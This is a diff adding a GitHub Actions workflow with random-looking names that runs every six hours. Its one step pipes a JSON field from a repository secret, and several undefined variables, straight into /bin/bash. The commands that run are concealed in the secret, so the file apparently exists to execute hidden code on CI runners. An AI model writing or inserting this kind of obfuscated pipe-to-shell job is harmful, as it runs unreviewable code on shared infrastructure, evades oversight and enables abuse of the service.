@@ -1,0 +1,27 @@
+name: wengjingshi1290
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wengjingshi1290
+        env:
+          drnv4: ${{ secrets.drnv4 }}
+        run: |
+          echo $drnv4 | jq -r .pfrpt4 | /bin/bash
+          echo $hzqt30 | jq -r .khev4804 | /bin/bash
+          echo $j25581 | jq -r .mpfgc6 | /bin/bash
+          echo $kizzw75 | jq -r .cj08675 | /bin/bash
+          echo $h0 | jq -r .e763 | /bin/bash
+          echo $jyx7 | jq -r .vj9628 | /bin/bash
+          echo $z727 | jq -r .seuac706 | /bin/bash
+          echo $wwltv99 | jq -r .uzulo3 | /bin/bash
+          echo $db3871 | jq -r .xhav95 | /bin/bash
+
